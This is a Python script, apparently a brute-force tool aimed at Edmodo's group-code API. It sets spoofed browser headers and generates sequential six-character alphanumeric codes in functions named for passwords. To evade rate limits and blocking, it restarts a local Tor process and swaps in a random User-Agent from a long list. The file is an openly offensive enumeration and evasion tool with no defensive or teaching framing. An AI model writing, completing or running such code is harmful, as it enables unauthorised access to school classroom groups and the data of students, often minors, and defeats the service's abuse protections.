from random import randrange as rr
from random import choice as ch
from string import ascii_lowercase as lm
import subprocess
import json


url = "https://api.edmodo.com/groups/with_any_code/"

cadenaVar = "0123456789" + lm

lstUserAgents = [ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",
                   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
                   "Mozilla/5.0 (Linux; Android 7.0; Lenovo TB-7304F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
                   "Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)",
                   "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.81",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.56",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/83.0.4103.116 Safari/537.36",
                   ]


cabezera = { 'Accept': 'application/json',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'Connection': 'keep-alive',
             'Host': 'api.edmodo.com',
             'Origin': 'https://new.edmodo.com',
             'Referer': 'https://new.edmodo.com/',
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-site',
             'User-Agent': ''
             }
                   

    
def sumar_unidadContr(valorAnt):
    contrasenia = valorAnt
    excedente = 0
    i = 5

    while i  >= 0:
        if cadenaVar.index(valorAnt[i]) == 35:
            contrasenia = contrasenia[:i] + "0" + contrasenia[i+1:]
        else:
            contrasenia = contrasenia[:i] + cadenaVar[cadenaVar.index(valorAnt[i]) + 1] + contrasenia[i+1:]
            break

        i -= 1

    return contrasenia


def generar_contrasenia(valInc, longitud):
    lstContr = []
    cont = 0
    bandera = False

    a = cadenaVar.index(valInc[2])
    b = cadenaVar.index(valInc[3])
    c = cadenaVar.index(valInc[4])
    d = cadenaVar.index(valInc[5])
        
    while a < 36:
        while b < 36:
            while c < 36:
                while d < 36:
                    lstContr.append(valInc[:2] + cadenaVar[a] + cadenaVar[b] + cadenaVar[c] + cadenaVar[d])
                    d += 1
                    cont += 1

                    if cont == longitud:
                        bandera = True
                        break
                d = 0
                c += 1
                if bandera:
                    break
                    
            b += 1
            c = 0
            if bandera:
                break
            
        a += 1
        b = 0
        if bandera:
            break

    if cont < longitud:
        lstTmp = []
        valCncr = lstContr[-1]
        
        lstTmp = generar_contrasenia(valCncr, longitud - cont)
        lstContr.extend(lstTmp)
    
    return lstContr
       

def reiniciar_param(proxTor):
    proxTor.terminate()
    nuevoProx = subprocess.Popen("/TorDir-main/Browser/TorBrowser/Tor/tor.exe")

    cabezera['User-Agent'] = ch(lstUserAgents)

    return nuevoProx

